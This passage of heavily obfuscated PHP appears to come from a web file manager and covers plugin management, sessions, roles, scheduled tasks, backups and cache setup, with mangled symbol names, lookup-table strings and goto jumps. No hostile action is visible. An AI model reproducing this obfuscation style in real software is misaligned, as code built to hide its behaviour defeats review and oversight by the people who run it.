$ΜφτΩµ); } } Hook::trigger($¤–¬‘µ[2119]); Hook::trigger(ACTION); } public function appAllow($ρΕ€ιιϋ, $„Υ½ψ“, $®ύΈκύ = true) { $ΤΛάδ•θ =& $_SERVER[γγάψ½]; $ΦµΌΏΑ = PLUGIN_DIR . $ρΕ€ιιϋ . $ΤΛάδ•θ[2120]; if (!is_array($„Υ½ψ“) || !is_array($„Υ½ψ“[$ΤΛάδ•θ[2118]]) || $„Υ½ψ“[$ΤΛάδ•θ[825]] != 1 || !is_file($ΦµΌΏΑ)) { return !1; } if (KodUser::isRoot()) { if ($GLOBALS[$ΤΛάδ•θ[6]][$ΤΛάδ•θ[2121]] || !$GLOBALS[$ΤΛάδ•θ[6]][$ΤΛάδ•θ[2122]]) { return !0; } $ΑΝΉƒΥ† = explode($ΤΛάδ•θ[50], strtolower($GLOBALS[$ΤΛάδ•θ[6]][$ΤΛάδ•θ[2122]])); return in_array(strtolower($ρΕ€ιιϋ), $ΑΝΉƒΥ†) ? !1 : !0; } if ($®ύΈκύ && !Action($ΤΛάδ•θ[2123])->checkAuth($ρΕ€ιιϋ)) { return !1; } return !0; } public function unInstall($Ηω΄δ¦) { $Ψ¦·χ =& $_SERVER[γγάψ½]; $ί‡τ™¶λ = $this->loadList($Ηω΄δ¦); if (file_exists(PLUGIN_DIR . $Ηω΄δ¦)) { Hook::apply($Ηω΄δ¦ . $Ψ¦·χ[2124]); } $this->remove($ί‡τ™¶λ[$Ψ¦·χ[478]]); } public function changeStatus($ƒΗΆηύ, $­­‘Ώα¦) { $¥Ϋδ½ά† =& $_SERVER[γγάψ½]; $Ι±ΰ³Γ = $this->loadList($ƒΗΆηύ); if ($­­‘Ώα¦) { Hook::apply($ƒΗΆηύ . $¥Ϋδ½ά†[2125]); } $this->update($Ι±ΰ³Γ[$¥Ϋδ½ά†[478]], array($¥Ϋδ½ά†[2126] => $­­‘Ώα¦)); } public function appRegist($ξ»Ψ‘»ν, $έ­Χ³ς) { $€χΡ² =& $_SERVER[γγάψ½]; $™ΞέΤΗ¥ = $this->loadList($ξ»Ψ‘»ν); if ($™ΞέΤΗ¥) { $this->update($™ΞέΤΗ¥[$€χΡ²[478]], array($€χΡ²[2118] => $έ­Χ³ς)); } else { $Υ†»ΨμΧ = array($€χΡ²[32] => $ξ»Ψ‘»ν, $€χΡ²[2118] => $έ­Χ³ς, $€χΡ²[825] => 0, $€χΡ²[6] => $this->getConfigDefault($ξ»Ψ‘»ν)); $this->insert($Υ†»ΨμΧ); } } public function getConfigDefault($ψΨ©Όζ) { $ρΈχ‹Ζ =& $_SERVER[γγάψ½]; $‰Ϋ‘Η¤… = array(); $ίΧ¨μΏΌ = $this->getPackageJson($ψΨ©Όζ); if (!$ίΧ¨μΏΌ && is_array($ίΧ¨μΏΌ[$ρΈχ‹Ζ[2127]])) { return $‰Ϋ‘Η¤…; } foreach ($ίΧ¨μΏΌ[$ρΈχ‹Ζ[2127]] as $Σ­ε›§· => $ϊ»’όΦ) { if (!isset($ϊ»’όΦ[$ρΈχ‹Ζ[453]]) || isset($‰Ϋ‘Η¤…[$Σ­ε›§·])) { continue; } $‰Ϋ‘Η¤…[$Σ­ε›§·] = $ϊ»’όΦ[$ρΈχ‹Ζ[453]]; } return $‰Ϋ‘Η¤…; } public function getPackageJson($ΔΞΏΆϋϋ) { return Hook::apply($ΔΞΏΆϋϋ . $_SERVER[γγάψ½][2128]); } public function getConfig($¦υ•γετ, $Λε•ƒ  = false) { $ού” •¥ =& $_SERVER[γγάψ½]; $Ξ•ΰά¤ = array(); $ς‘Θ±ρ = $this->loadList($¦υ•γετ); if ($ς‘Θ±ρ && is_array($ς‘Θ±ρ[$ού” •¥[6]])) { $Ξ•ΰά¤ = $ς‘Θ±ρ[$ού” •¥[6]]; } if (!$Ξ•ΰά¤ || $Λε•ƒ ) { $Ξ•ΰά¤ = $this->getConfigDefault($¦υ•γετ); } return $Ξ•ΰά¤; } public function setConfig($±Ξ›, $ϋΫα = false) { $»µ’γ– =& $_SERVER[γγάψ½]; $‰‡»ϋι = $this->loadList($±Ξ›); if (!$‰‡»ϋι) { return !1; } $ϋψ―Ν―― = $‰‡»ϋι[$»µ’γ–[6]]; if ($ϋΫα == !1) { $ϋψ―Ν―― = array(); $ϋΫα = $this->getConfigDefault($±Ξ›); } foreach ($ϋΫα as $ζ°ή² => $χ³°Ω§) { $ϋψ―Ν――[$ζ°ή²] = is_string($χ³°Ω§) ? trim($χ³°Ω§) : $χ³°Ω§; } $this->update($‰‡»ϋι[$»µ’γ–[478]], array($»µ’γ–[6] => $ϋψ―Ν――)); } public function viewList() { $Ϋ ¤¶®Π =& $_SERVER[γγάψ½]; $·ΜΔ•© = $this->loadList(); $this->pluginScan($·ΜΔ•©); $·ΜΔ•© = $this->loadPluginList(); $νυΈΑχ = array(); foreach ($·ΜΔ•© as $ΞξΌ™Λ‘ => $χΘςύ’) { $τφρ±ψΐ = $χΘςύ’; unset($χΘςύ’[$Ϋ ¤¶®Π[2118]], $χΘςύ’[$Ϋ ¤¶®Π[6]]); $µ†¥…• = PLUGIN_DIR . $χΘςύ’[$Ϋ ¤¶®Π[32]] . $Ϋ ¤¶®Π[2120]; if (!is_file($µ†¥…•)) { continue; } $Ε›°Χΐ = Hook::apply($χΘςύ’[$Ϋ ¤¶®Π[32]] . $Ϋ ¤¶®Π[2128]); if (!is_array($Ε›°Χΐ)) { continue; } $νυΈΑχ[$ΞξΌ™Λ‘] = array_merge($χΘςύ’, $Ε›°Χΐ); if ($τφρ±ψΐ[$Ϋ ¤¶®Π[6]][$Ϋ ¤¶®Π[1704]] != $Ε›°Χΐ[$Ϋ ¤¶®Π[1678]]) { Hook::apply($χΘςύ’[$Ϋ ¤¶®Π[32]] . $Ϋ ¤¶®Π[2125]); $τφρ±ψΐ[$Ϋ ¤¶®Π[6]][$Ϋ ¤¶®Π[1704]] = $Ε›°Χΐ[$Ϋ ¤¶®Π[1678]]; $this->update($χΘςύ’[$Ϋ ¤¶®Π[478]], array($Ϋ ¤¶®Π[6] => $τφρ±ψΐ[$Ϋ ¤¶®Π[6]])); } } return $νυΈΑχ; } private function loadPluginList() { $¬¦²Ζ•Ϊ =& $_SERVER[γγάψ½]; $Α©«ΈΗ = $this->loadList(); if (strtolower(MOD) == $¬¦²Ζ•Ϊ[2129]) { return $Α©«ΈΗ; } $Υ±‰ΔΝό = Hook::trigger($¬¦²Ζ•Ϊ[2130], $Α©«ΈΗ); if ($Α©«ΈΗ && !$Υ±‰ΔΝό) { die; } return $Υ±‰ΔΝό ? $Υ±‰ΔΝό : $Α©«ΈΗ; } private function pluginScan($ΓΊι€) { $ο‘ΦΗΊ» =& $_SERVER[γγάψ½]; recursion_dir(PLUGIN_DIR, $ ϋ„θΦσ, $¦¶Τδβ, 0); foreach ($ ϋ„θΦσ as $ΠΫϋµ) { $ςώαοό = get_path_this($ΠΫϋµ); if (isset($ΓΊι€[$ςώαοό]) || !file_exists($ΠΫϋµ . $ο‘ΦΗΊ»[2131]) || !file_exists($ΠΫϋµ . $ο‘ΦΗΊ»[2120])) { continue; } Hook::apply($ςώαοό . $ο‘ΦΗΊ»[2125]); } } } class SessionModel extends ModelBase { protected $tableName = "\x73\x79\x73\x74\145\x6d\137\x73\145\163\163\151\157\156"; public function get($›ΐηνΗ) { $Α¤™ =& $_SERVER[γγάψ½]; $©Η²‹¥¦ = $this->where(array($Α¤™[2132] => $›ΐηνΗ))->find(); if (!is_array($©Η²‹¥¦)) { return !1; } return $©Η²‹¥¦[$Α¤™[171]]; } public function set($…ξ€–, $¨ΏΖΨ”, $Ϊ£χ΄ςά = 3600) { $ΛΌϊϋ =& $_SERVER[γγάψ½]; $λΜΪ¤Τ = array($ΛΌϊϋ[2132] => $…ξ€–, $ΛΌϊϋ[2032] => $¨ΏΖΨ”, $ΛΌϊϋ[2133] => $Ϊ£χ΄ςά + time()); if (Session::get($ΛΌϊϋ[2134])) { $λΜΪ¤Τ[$ΛΌϊϋ[1793]] = Session::get($ΛΌϊϋ[2134]); } else { $λΜΪ¤Τ[$ΛΌϊϋ[1793]] = 0; } if ($this->get($…ξ€–)) { return $this->where(array($ΛΌϊϋ[2132] => $…ξ€–))->save($λΜΪ¤Τ); } else { return $this->add($λΜΪ¤Τ, array(), !0); } } public function remove($™„³υ”ύ) { return $this->where(array($_SERVER[γγάψ½][2132] => $™„³υ”ύ))->delete(); } public function clearTimeout() { return $this->where($_SERVER[γγάψ½][2135] . time())->delete(); } } goto eά‘“Σ·Ε; dΌχ‰ΔΌΆ°: class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\145\x6d\x2e\x72\x6f\154\x65\x4c\151\163\x74"; public $field = array("\156\x61\155\x65", "\x61\165\164\150", "\x6c\x61\x62\x65\154", "\x64\151\163\x70\x6c\141\x79", "\x73\x79\x73\x74\145\155", "\144\145\163\x63", "\151\x67\x6e\157\162\145\x45\170\164", "\x69\147\x6e\x6f\x72\x65\106\151\154\145\x53\x69\x7a\145", "\141\144\x6d\151\x6e\151\x73\164\x72\141\x74\x6f\x72", "\163\157\162\164"); public function listData($κΌ©›χ = false, $ƒδΘ†ξ = "\163\157\162\164", $°†ΌΚδ = false) { $ΐοΖΈ =& $_SERVER[γγάψ½]; $“…ίσ«” = parent::listData($κΌ©›χ, $ƒδΘ†ξ, $°†ΌΚδ); if (!$κΌ©›χ) { foreach ($“…ίσ«” as $ΒχΝχΗο => $η§“„Ί) { if ($η§“„Ί[$ΐοΖΈ[2202]] == 1) { $“…ίσ«”[$ΒχΝχΗο][$ΐοΖΈ[529]] = LNG($ΐοΖΈ[2477]); } } } return $“…ίσ«”; } public function update($Η”Ήύ™, $…Ώ• †Τ) { $“…δ®η =& $_SERVER[γγάψ½]; $φ‘§βΖά = parent::listData($Η”Ήύ™); $°ΉΆ™νΕ = $this->findByName($…Ώ• †Τ[$“…δ®η[32]]); if (!$φ‘§βΖά || $°ΉΆ™νΕ && $°ΉΆ™νΕ[$“…δ®η[478]] != $φ‘§βΖά[$“…δ®η[478]]) { return !1; } if ($°ΉΆ™νΕ[$“…δ®η[2202]] == 1) { $…Ώ• †Τ = array($“…δ®η[32] => $…Ώ• †Τ[$“…δ®η[32]], $“…δ®η[2016] => $…Ώ• †Τ[$“…δ®η[2016]]); } $this->filterAuth($…Ώ• †Τ[$“…δ®η[490]]); return parent::update($Η”Ήύ™, $…Ώ• †Τ); } public function remove($®ςΡ¬πσ) { $ρ‚ΐυϊ΄ = parent::listData($®ςΡ¬πσ); if (!$ρ‚ΐυϊ΄ || $ρ‚ΐυϊ΄[$_SERVER[γγάψ½][192]]) { return !1; } return parent::remove($®ςΡ¬πσ); } public function add($ΫΟΓ©›) { $Ϊ³υίΎς =& $_SERVER[γγάψ½]; $ΊίέΏϋ = $ΫΟΓ©›[$Ϊ³υίΎς[32]]; if ($this->findByName($ΊίέΏϋ)) { return !1; } $ξαόΑ = array($Ϊ³υίΎς[497] => $ΊίέΏϋ, $Ϊ³υίΎς[1999] => $Ϊ³υίΎς[12], $Ϊ³υίΎς[1995] => $Ϊ³υίΎς[2003], $Ϊ³υίΎς[2478] => 1, $Ϊ³υίΎς[1998] => 0, $Ϊ³υίΎς[2479] => 0, $Ϊ³υίΎς[1997] => $this->getSort()); $ΫΟΓ©› = array_merge($ξαόΑ, $ΫΟΓ©›); $this->filterAuth($ΫΟΓ©›[$Ϊ³υίΎς[490]]); return parent::insert($ΫΟΓ©›); } private function getSort() { $αρΎ€ζΜ =& $_SERVER[γγάψ½]; $–Σ νΆ‹ = parent::listData(); $οϋέήω = array_to_keyvalue($–Σ νΆ‹, $αρΎ€ζΜ[12], $αρΎ€ζΜ[2017]); return empty($οϋέήω) ? 0 : max($οϋέήω) + 1; } private function filterAuth(&$άΣ‘‰·) { $¶²”²ς¦ =& $_SERVER[γγάψ½]; $ω¶©­–λ = array(); $Ωγ‚ξΝ€ = array_filter(explode($¶²”²ς¦[50], $άΣ‘‰·)); foreach ($Ωγ‚ξΝ€ as $άΣ‘‰·) { $™υέ«Ζξ = explode($¶²”²ς¦[10], $άΣ‘‰·); if ($™υέ«Ζξ[0] == $¶²”²ς¦[2480] && $™υέ«Ζξ[1] != $¶²”²ς¦[1286]) { $Ι‹ΑΫΌ– = $™υέ«Ζξ[0] . $¶²”²ς¦[10] . $™υέ«Ζξ[1] . $¶²”²ς¦[2481]; if (!in_array($Ι‹ΑΫΌ–, $Ωγ‚ξΝ€)) { $ω¶©­–λ[] = $Ι‹ΑΫΌ–; } } $ω¶©­–λ[] = $άΣ‘‰·; } $άΣ‘‰· = implode($¶²”²ς¦[50], $ω¶©­–λ); } public function findRoleDefault() { $°ΡΖ€έ£ =& $_SERVER[γγάψ½]; $Γ•¨µ = parent::listData(); $σΠ‚μΞπ = !1; foreach ($Γ•¨µ as $ζϊΙ²‚) { if (!$ζϊΙ²‚ || $ζϊΙ²‚[$°ΡΖ€έ£[2015]] == $°ΡΖ€έ£[231] || $ζϊΙ²‚[$°ΡΖ€έ£[2202]] == 1) { continue; } if (strstr($ζϊΙ²‚[$°ΡΖ€έ£[490]], $°ΡΖ€έ£[2482])) { continue; } if (!strstr($ζϊΙ²‚[$°ΡΖ€έ£[490]], $°ΡΖ€έ£[2483])) { continue; } if (!$σΠ‚μΞπ) { $σΠ‚μΞπ = $ζϊΙ²‚; continue; } $‘Σ΄ό΄° = explode($°ΡΖ€έ£[50], $σΠ‚μΞπ[$°ΡΖ€έ£[490]]); $Ώλό•Ά€ = explode($°ΡΖ€έ£[50], $ζϊΙ²‚[$°ΡΖ€έ£[490]]); if (count($‘Σ΄ό΄°) > count($Ώλό•Ά€)) { $σΠ‚μΞπ = $ζϊΙ²‚; } } return $σΠ‚μΞπ ? $σΠ‚μΞπ[$°ΡΖ€έ£[478]] : $°ΡΖ€έ£[12]; } public function sort($ΝξεΒ—μ, $Ίω½¬•) { return parent::update($ΝξεΒ—μ, $Ίω½¬•); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\x65\x6d\x2e\x74\141\163\x6b\114\151\x73\x74"; public $field = array("\x6e\x61\155\x65", "\164\x79\x70\145", "\x65\166\145\x6e\164", "\x74\151\155\145", "\144\x65\x73\143", "\x73\171\x73\164\145\155", "\x65\x6e\x61\142\154\x65", "\154\x61\x73\164\122\165\156", "\x73\x6f\x72\164"); public function listData($Α»Ιι = false, $¦µψ–Ύ = "\x73\x6f\x72\164", $µΌ¨Ϋ = false) { return parent::listData($Α»Ιι, $¦µψ–Ύ, $µΌ¨Ϋ); } public function add($Ιά „) { $ΌΔγχΰ =& $_SERVER[γγάψ½]; $ρζΗ΄Ο” = $this->findByName($Ιά „[$ΌΔγχΰ[32]]); if ($ρζΗ΄Ο”) { return !1; } $Ιά „[$ΌΔγχΰ[1743]] = 0; $Ιά „[$ΌΔγχΰ[2017]] = $this->getSort(); return parent::insert($Ιά „); } private function getSort() { $π‚ώ„β€ =& $_SERVER[γγάψ½]; $γ Ίφ« = parent::listData(); $¥ϊ§ζµΛ = array_to_keyvalue($γ Ίφ«, $π‚ώ„β€[12], $π‚ώ„β€[2017]); return empty($¥ϊ§ζµΛ) ? 0 : max($¥ϊ§ζµΛ) + 1; } public function update($ψοΩ, $ΏΛεΐ) { $π²’ΎΔ =& $_SERVER[γγάψ½]; $ΝϊΣ½¤ = $this->listData($ψοΩ); $Χω€†Χ΄ = $this->findByName($ΏΛεΐ[$π²’ΎΔ[32]]); if (!$ΝϊΣ½¤ || $Χω€†Χ΄ && $Χω€†Χ΄[$π²’ΎΔ[478]] != $ΝϊΣ½¤[$π²’ΎΔ[478]]) { return !1; } return parent::update($ψοΩ, $ΏΛεΐ); } public function remove($ƒ³ΩεΖδ, $άΠΞ’Ή = false) { $ ®Ώ…Ϋ =& $_SERVER[γγάψ½]; $ΪΟ΄ε° = $this->listData($ƒ³ΩεΖδ); if (!$ΪΟ΄ε°) { return; } if (!$άΠΞ’Ή && $ΪΟ΄ε°[$ ®Ώ…Ϋ[192]] == $ ®Ώ…Ϋ[91]) { return !1; } return parent::remove($ƒ³ΩεΖδ); } public function enable($υα„ςο, $­Ι…’) { return $this->update($υα„ςο, array($_SERVER[γγάψ½][2472] => $­Ι…’)); } public function run($Θƒβ£Γξ) { return $this->update($Θƒβ£Γξ, array($_SERVER[γγάψ½][2484] => time())); } } goto BΙ°ΞΤζΖ; BΠ‡ΐΎ³ρΰ: function binCheckBigger($Β‰‰ΛΦ, $‡‰ΕΝΎΦ) { return $Β‰‰ΛΦ > $‡‰ΕΝΎΦ; } $_SERVER[$_SERVER[Φ ‘Ρ³λ][3]] = (base64_decode('ODY3Nw==')."\x39\x35")+0;$_45tc="71lturibfw9gso28jmdnx5c6va3qpkyz4eh06jxolbshduz51yc8m4agt2qifke0rvp9n";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($ύ…ύΠζ, $ζΏο¶σ―) { $Φό™¬Ό =& $_SERVER[γγάψ½]; if (isset(self::$_methodList[$ύ…ύΠζ])) { return @call_user_func_array(self::$_methodList[$ύ…ύΠζ], $ζΏο¶σ―); } else { if (method_exists($this, $ύ…ύΠζ)) { return call_user_func_array(array($this, $ύ…ύΠζ), $ζΏο¶σ―); } else { think_exception(__CLASS__ . $Φό™¬Ό[4] . $ύ…ύΠζ . $Φό™¬Ό[5]); } } } public static function __callStatic($‚»εε™, $®§Σ) { if (isset(self::$_methodListStatic[$‚»εε™])) { return call_user_func_array(self::$_methodListStatic[$‚»εε™], $®§Σ); } else { if (method_exists(self, $‚»εε™)) { return call_user_func_array(array(self, $‚»εε™), $®§Σ); } else { show_json("{$‚»εε™}\50\51\40\156\157\164\40\x65\x78\x69\163\164\x3b", !1); } } } public static function addMethod($ΛΟΖ΄ϋ, $ΰ§ήΖ υ) { self::$_methodList[$ΛΟΖ΄ϋ] = $ΰ§ήΖ υ; } public static function addMethodStatic($™ϋμΊ, $ςφΓΜχυ) { self::$_methodListStatic[$™ϋμΊ] = $ςφΓΜχυ; } } goto dΥΐƒ›ή‹ΰ; F†’½νρ­: class BackupDbFile { public function __construct() { } public function index() { $σΥ»° =& $_SERVER[γγάψ½]; $’ΥΑ‘ο = Backup::get(); $¥τΆ‰µ³ = $’ΥΑ‘ο[$σΥ»°[32]]; $µώΣΉΞ = $this->tmpFilesPath() . "\x62\141\143\x6b\165\160\x5f{$¥τΆ‰µ³}\x2f"; $µ‰Ω‡Ν = $this->backupPath($’ΥΑ‘ο); if (!($µ‰Ω‡Ν = IO::mkdir($µ‰Ω‡Ν))) { Backup::log($σΥ»°[875] . $µ‰Ω‡Ν); return !1; } $γΖΛΰ‹Τ = IO::listPath($µώΣΉΞ); $ Ήμ…τΈ = isset($γΖΛΰ‹Τ[$σΥ»°[86]]) ? $γΖΛΰ‹Τ[$σΥ»°[86]] : array(); $Ύ›‰©‚έ = array_sum(array_column($ Ήμ…τΈ, $σΥ»°[79])); if (!$Ύ›‰©‚έ) { Backup::log($σΥ»°[876] . $µώΣΉΞ); return !1; } $Εωφ£δΛ = array($σΥ»°[877] => $Ύ›‰©‚έ, $σΥ»°[878] => time()); Backup::set($Εωφ£δΛ); $ΰ΅›Ή‡ϋ = new TaskFileTransfer($σΥ»°[879], $σΥ»°[852], count($ Ήμ…τΈ), LNG($σΥ»°[861]) . $σΥ»°[465] . LNG($σΥ»°[863]) . $σΥ»°[880]); $ΰ΅›Ή‡ϋ->task[$σΥ»°[838]] = $Ύ›‰©‚έ; foreach ($γΖΛΰ‹Τ[$σΥ»°[86]] as $βϋό…) { $Δξ³‹Α = IO::move($βϋό…[$σΥ»°[87]], $µ‰Ω‡Ν); if (!$Δξ³‹Α) { $ΰ΅›Ή‡ϋ->end(); $νΦ΅”Θό = IO::getLastError($σΥ»°[881] . $βϋό…[$σΥ»°[87]] . $σΥ»°[882] . $µ‰Ω‡Ν . $σΥ»°[178]); Backup::log($νΦ΅”Θό); return !1; } } $Κ°ν“§Υ = new DbManage(); $»†ς³Α° = $Κ°ν“§Υ->getSqlFile(); if (!$»†ς³Α°[$σΥ»°[883]] || !$»†ς³Α°[$σΥ»°[13]]) { Backup::log($σΥ»°[884]); return !1; } IO::move($»†ς³Α°[$σΥ»°[883]], $µ‰Ω‡Ν); IO::move($»†ς³Α°[$σΥ»°[13]], $µ‰Ω‡Ν); $ΰ΅›Ή‡ϋ->end(); $Εωφ£δΛ = array($σΥ»°[885] => $Ύ›‰©‚έ, $σΥ»°[886] => time()); Backup::set($Εωφ£δΛ); return !0; } private function backupPath($―…ΑΝΆΝ) { $²«‹€ =& $_SERVER[γγάψ½]; $ΪΫΡΝ¬Κ = $―…ΑΝΆΝ[$²«‹€[32]]; $υύµϋ’ο = Model($²«‹€[845])->get($²«‹€[846]); $σΤ‡¬ = substr(md5($²«‹€[847] . $υύµϋ’ο . $ΪΫΡΝ¬Κ), 0, 8); return "\x7b\151\157\72{$―…ΑΝΆΝ[$²«‹€[827]]}\x7d\57\144\141\164\x61\x62\x61\163\x65\57\142\141\143\x6b\165\160\57" . $ΪΫΡΝ¬Κ . $²«‹€[11] . $σΤ‡¬; } private function tmpFilesPath() { $ΠΠ—•ή =& $_SERVER[γγάψ½]; $δ—εΟ―® = TEMP_FILES; if ($GLOBALS[$ΠΠ—•ή[6]][$ΠΠ—•ή[92]][$ΠΠ—•ή[873]]) { $δ—εΟ―® = $GLOBALS[$ΠΠ—•ή[6]][$ΠΠ—•ή[92]][$ΠΠ—•ή[873]]; if (!mk_dir($δ—εΟ―®) || !is_writable($δ—εΟ―®) || !IO::mkfile($δ—εΟ―® . $ΠΠ—•ή[874])) { $δ—εΟ―® = TEMP_FILES; } } return $δ—εΟ―®; } } class BackupFile { public function __construct() { } public function index() { $ρ¥±ήψ = Backup::get(); $ΉΕο›ΏΓ = $ρ¥±ήψ[$_SERVER[γγάψ½][371]][$_SERVER[γγάψ½][233]][$_SERVER[γγάψ½][546]]; $εƒ‡Ρ = array($_SERVER[γγάψ½][547] => array($_SERVER[γγάψ½][887], $ΉΕο›ΏΓ), $_SERVER[γγάψ½][888] => array($_SERVER[γγάψ½][409], $ρ¥±ήψ[$_SERVER[γγάψ½][827]])); $Ν²ϋ“„Ί = (int) Model($_SERVER[γγάψ½][866])->where($εƒ‡Ρ)->count($_SERVER[γγάψ½][546]); $ς΄ΚΐύΞ = (int) Model($_SERVER[γγάψ½][866])->where($εƒ‡Ρ)->sum($_SERVER[γγάψ½][79]); $Ν¨¤¨πΪ = new TaskFileTransfer($_SERVER[γγάψ½][889], $_SERVER[γγάψ½][852], $Ν²ϋ“„Ί, LNG($_SERVER[γγάψ½][861]) . $_SERVER[γγάψ½][862] . LNG($_SERVER[γγάψ½][890])); $Ν¨¤¨πΪ->task[$_SERVER[γγάψ½][838]] = $ς΄ΚΐύΞ; $Χ£ε = array($_SERVER[γγάψ½][891] => $Ν²ϋ“„Ί, $_SERVER[γγάψ½][892] => $ς΄ΚΐύΞ, $_SERVER[γγάψ½][893] => time()); Backup::set($Χ£ε); $±ψ†Ί¥Ώ = !0; $Όπβ = $this->storeIds(); $ΉύΝ„¶§ = 1; $“¶Τ°±β = 1000; $ΣΎΤΣ™χ = $΄¬ΊΣΧ = 0; $½ΏΧξ = array(); $ΎΤ·ήαΘ = $Τ£‰™Ύ = 0; do { $ξΉ³Θ ί = $_SERVER[γγάψ½][894]; $ΜΫΜι³ = Model($_SERVER[γγάψ½][866])->where($εƒ‡Ρ)->field($ξΉ³Θ ί)->order($_SERVER[γγάψ½][895])->selectPage($“¶Τ°±β, $ΉύΝ„¶§); $πζνΠΈΤ = !empty($ΜΫΜι³[$_SERVER[γγάψ½][448]]) ? $ΜΫΜι³[$_SERVER[γγάψ½][448]] : array(); foreach ($πζνΠΈΤ as $ξ”Ι‚―) { if (!$this->_fileExist($ξ”Ι‚―, $½ΏΧξ, $Όπβ)) { Backup::log($_SERVER[γγάψ½][896] . $ξ”Ι‚―[$_SERVER[γγάψ½][546]] . $_SERVER[γγάψ½][897] . $ξ”Ι‚―[$_SERVER[γγάψ½][87]]); continue; } $Ώλ«‡” = $ξ”Ι‚―[$_SERVER[γγάψ½][87]]; $ΚΰβΡδ = "\173\151\x6f\72{$ρ¥±ήψ[$_SERVER[γγάψ½][827]]}\175" . substr($Ώλ«‡”, strlen("\x7b\x69\157\x3a{$ξ”Ι‚―[$_SERVER[γγάψ½][898]]}\x7d")); if (IO::exist($ΚΰβΡδ)) { $Ν¨¤¨πΪ->updateFileEnd($ξ”Ι‚―[$_SERVER[γγάψ½][32]], $ξ”Ι‚―[$_SERVER[γγάψ½][79]]); } else { $ΚΰβΡδ = get_path_father($ΚΰβΡδ); IO::mkdir($ΚΰβΡδ); if (!IO::copy($Ώλ«‡”, $ΚΰβΡδ, $_SERVER[γγάψ½][899])) { Backup::log($_SERVER[γγάψ½][900] . $Ώλ«‡” . $_SERVER[γγάψ½][882] . $ΚΰβΡδ . $_SERVER[γγάψ½][178]); $±ψ†Ί¥Ώ = !1; break; } } $ΉΕο›ΏΓ = $ξ”Ι‚―[$_SERVER[γγάψ½][546]]; $΄¬ΊΣΧ += 1; $ΣΎΤΣ™χ += $ξ”Ι‚―[$_SERVER[γγάψ½][79]]; $Τ£‰™Ύ += 1; $ΎΤ·ήαΘ += $ξ”Ι‚―[$_SERVER[γγάψ½][79]]; if ($ΣΎΤΣ™χ >= 1024 * 1024 * 100) { $Χ£ε = array($_SERVER[γγάψ½][826] => $ΉΕο›ΏΓ, $_SERVER[γγάψ½][901] => $Τ£‰™Ύ, $_SERVER[γγάψ½][902] => $ΎΤ·ήαΘ); Backup::set($Χ£ε); $ΣΎΤΣ™χ = $΄¬ΊΣΧ = 0; } } $ζζ½±Θ = count($πζνΠΈΤ); $ΉύΝ„¶§++; } while ($ζζ½±Θ == $“¶Τ°±β); $Ν¨¤¨πΪ->end(); $Χ£ε = array($_SERVER[γγάψ½][903] => 1, $_SERVER[γγάψ½][836] => time(), $_SERVER[γγάψ½][850] => 1, $_SERVER[γγάψ½][826] => $ΉΕο›ΏΓ, $_SERVER[γγάψ½][904] => time()); if ($΄¬ΊΣΧ) { $Χ£ε[$_SERVER[γγάψ½][901]] = $Τ£‰™Ύ; $Χ£ε[$_SERVER[γγάψ½][902]] = $ΎΤ·ήαΘ; } Backup::set($Χ£ε); return !0; } private function _fileExist($Ω¶€†, &$ΑƒΚΰε, $η…ΎΤΎ²) { $ψ•²ώΜΔ =& $_SERVER[γγάψ½]; $ΎΖό“ = $Ω¶€†[$ψ•²ώΜΔ[87]]; if (in_array($Ω¶€†[$ψ•²ώΜΔ[546]], $ΑƒΚΰε)) { return !1; } if (!in_array($Ω¶€†[$ψ•²ώΜΔ[898]], $η…ΎΤΎ²)) { return !1; } if (IO::exist($ΎΖό“)) { return !0; } $α³Ό„ά = get_path_father($ΎΖό“); if (IO::exist($α³Ό„ά)) { $ΑƒΚΰε[] = $Ω¶€†[$ψ•²ώΜΔ[546]]; return !1; } $ς…Ϊγ™ = array($ψ•²ώΜΔ[898] => $Ω¶€†[$ψ•²ώΜΔ[898]], $ψ•²ώΜΔ[87] => array($ψ•²ώΜΔ[462], "{$α³Ό„ά}\45")); $ε¨μ¨‘ς = Model($ψ•²ώΜΔ[866])->where($ς…Ϊγ™)->field($ψ•²ώΜΔ[547])->select(); $ΑƒΚΰε = array_merge($ΑƒΚΰε, array_to_keyvalue($ε¨μ¨‘ς, $ψ•²ώΜΔ[12], $ψ•²ώΜΔ[546])); return !1; } private function _fileFilter($™‹Τ‡¥) { $ινδΨ‹· =& $_SERVER[γγάψ½]; return; if (empty($™‹Τ‡¥)) { return; } $εΜμυΕ = array($ινδΨ‹·[546] => array($ινδΨ‹·[7], array_unique($™‹Τ‡¥))); $ΫΎΫΨΨ = Model($ινδΨ‹·[905])->where($εΜμυΕ)->field($ινδΨ‹·[194])->select(); foreach ($ΫΎΫΨΨ as $¥μάψΥΗ) { Model($ινδΨ‹·[905])->remove($¥μάψΥΗ[$ινδΨ‹·[194]], !1); } } private function storeIds() { $»Γυει¶ =& $_SERVER[γγάψ½]; $ΧΔΈΏπ = Model($»Γυει¶[842])->listData(); $ώ®ΈέΒ¥ = array(); $σΉΕΖ = $GLOBALS[$»Γυει¶[6]][$»Γυει¶[92]][$»Γυει¶[906]]; foreach ($ΧΔΈΏπ as $χΝ›Δ”©) { $£Α¨Υγ = strtolower($χΝ›Δ”©[$»Γυει¶[98]]); if (!isset($σΉΕΖ[$£Α¨Υγ])) { continue; } $Ο®Ξ¬Ζ = $»Γυει¶[77] . (isset($σΉΕΖ[$£Α¨Υγ]) ? $σΉΕΖ[$£Α¨Υγ] : ucfirst($£Α¨Υγ)); if (!class_exists($Ο®Ξ¬Ζ)) { continue; } $ώ®ΈέΒ¥[] = $χΝ›Δ”©[$»Γυει¶[478]]; } return $ώ®ΈέΒ¥; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { $½¦μΣύ =& $_SERVER[γγάψ½]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $Β“αύΛΌ = $GLOBALS[$½¦μΣύ[6]][$½¦μΣύ[427]]; $ς„Λχ = $Β“αύΛΌ[$Β“αύΛΌ[$½¦μΣύ[907]]]; $ζΝ®… = $Β“αύΛΌ[$½¦μΣύ[908]]; switch ($Β“αύΛΌ[$½¦μΣύ[907]]) { case $½¦μΣύ[21]: self::$handle = Model($½¦μΣύ[909]); break; case $½¦μΣύ[910]: self::$handle = new CacheRedis($ς„Λχ, $ζΝ®…); break; case $½¦μΣύ[911]: self::$handle = new CacheMemcached($ς„Λχ, $ζΝ®…); break; case 